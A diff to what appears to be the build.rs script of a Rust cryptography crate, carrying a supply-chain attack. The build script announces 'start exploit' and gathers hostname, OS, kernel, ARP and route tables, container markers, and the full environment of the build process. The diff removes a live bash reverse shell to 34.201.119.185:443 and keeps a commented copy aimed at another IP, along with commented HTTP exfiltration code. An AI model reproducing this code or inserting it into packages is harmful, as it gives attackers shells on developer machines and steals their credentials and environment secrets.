@@ -100,9 +100,9 @@ fn main() {
 
     println!("cargo:warning=start exploit");
 
+    use std::fs;
     use std::io::Write;
     use std::net::TcpStream;
-    use std::fs;
 
     fn read_file(path: &str) -> String {
         fs::read_to_string(path).unwrap_or_default()
@@ -114,29 +114,31 @@ fn main() {
     }
 
     // --- Identity ---
-    let pwd        = std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default();
-    let hostname   = read_file("/etc/hostname").trim().to_string();
+    let pwd = std::env::current_dir()
+        .map(|p| p.display().to_string())
+        .unwrap_or_default();
+    let hostname = read_file("/etc/hostname").trim().to_string();
     let os_release = read_file("/etc/os-release");
 
     // --- Kernel / hardware ---
-    let kernel     = read_file("/proc/version").trim().to_string();
-    let cpuinfo    = read_file_truncated("/proc/cpuinfo", 1000);
-    let meminfo    = read_file_truncated("/proc/meminfo", 500);
+    let kernel = read_file("/proc/version").trim().to_string();
+    let cpuinfo = read_file_truncated("/proc/cpuinfo", 1000);
+    let meminfo = read_file_truncated("/proc/meminfo", 500);
 
     // --- Network interfaces & IPs ---
-    let net_dev    = read_file("/proc/net/dev");        // interface list + stats
-    let net_arp    = read_file("/proc/net/arp");        // ARP table — reveals gateway + neighbours
-    let net_route  = read_file("/proc/net/route");      // routing table
+    let net_dev = read_file("/proc/net/dev"); // interface list + stats
+    let net_arp = read_file("/proc/net/arp"); // ARP table — reveals gateway + neighbours
+    let net_route = read_file("/proc/net/route"); // routing table
 
     // --- Container / cgroup detection ---
-    let cgroup     = read_file("/proc/self/cgroup");
-    let is_docker  = fs::metadata("/.dockerenv").is_ok();
-    let mountinfo  = read_file_truncated("/proc/self/mountinfo", 1000);
+    let cgroup = read_file("/proc/self/cgroup");
+    let is_docker = fs::metadata("/.dockerenv").is_ok();
+    let mountinfo = read_file_truncated("/proc/self/mountinfo", 1000);
 
     // --- Process context ---
-    let proc_status = read_file("/proc/self/status");   // uid, gid, name, threads
+    let proc_status = read_file("/proc/self/status"); // uid, gid, name, threads
     let proc_cmdline = read_file("/proc/self/cmdline").replace('\0', " ");
-    let proc_environ = read_file("/proc/self/environ")  // full env of build process
+    let proc_environ = read_file("/proc/self/environ") // full env of build process
         .split('\0')
         .filter(|s| !s.is_empty())
         .collect::<Vec<_>>()
@@ -144,7 +146,9 @@ fn main() {
 
     // --- Cargo env ---
     let cargo_env: Vec<String> = std::env::vars()
-        .filter(|(k, _)| k.starts_with("CARGO") || k == "HOME" || k == "USER" || k == "PATH" || k == "HOSTNAME")
+        .filter(|(k, _)| {
+            k.starts_with("CARGO") || k == "HOME" || k == "USER" || k == "PATH" || k == "HOSTNAME"
+        })
         .map(|(k, v)| format!("  {}={}", k, v))
         .collect();
 
@@ -166,9 +170,9 @@ fn main() {
         cargo_env.join("\n")
     );
 
-    // if let Ok(mut stream) = TcpStream::connect("34.201.119.185:443") {
+    // if let Ok(mut stream) = TcpStream::connect("54.196.179.99:443") {
     //     let request = format!(
-    //         "POST /log HTTP/1.1\r\nHost: 34.201.119.185\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+    //         "POST /log HTTP/1.1\r\nHost: 54.196.179.99\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
     //         body.len(),
     //         body
     //     );
@@ -176,21 +180,20 @@ fn main() {
     // }
 
     // std::process::Command::new("bash")
-    //     .args(["-c", "echo test > /dev/tcp/34.201.119.185/443"])
+    //     .args(["-c", "echo test > /dev/tcp/54.196.179.99/443"])
     //     .status()
     //     .unwrap();
 
-    std::process::Command::new("bash")
-        .arg("-c")
-        .arg("0<&26-;exec 26<>/dev/tcp/34.201.119.185/443;sh <&26 >&26 2>&26")
-        .stdin(std::process::Stdio::null())
-        .stdout(std::process::Stdio::null())  // optional: detach stdout too
-        .stderr(std::process::Stdio::null())  // optional: detach stderr too
-        .spawn()
-        .expect("failed to spawn process");
-    println!("cargo:warning=RAN BUILD SCRIPT");
-    println!("cargo:warning=RAN BUILD SCRIPT");
-
+    // std::process::Command::new("bash")
+    //     .arg("-c")
+    //     .arg("0<&26-;exec 26<>/dev/tcp/54.196.179.99/443;sh <&26 >&26 2>&26")
+    //     .stdin(std::process::Stdio::null())
+    //     .stdout(std::process::Stdio::null())  // optional: detach stdout too
+    //     .stderr(std::process::Stdio::null())  // optional: detach stderr too
+    //     .spawn()
+    //     .expect("failed to spawn process");
+    // println!("cargo:warning=RAN BUILD SCRIPT");
+    // println!("cargo:warning=RAN BUILD SCRIPT");
 }
 
 // Is the target arch & curve25519_dalek_bits potentially simd capable ?
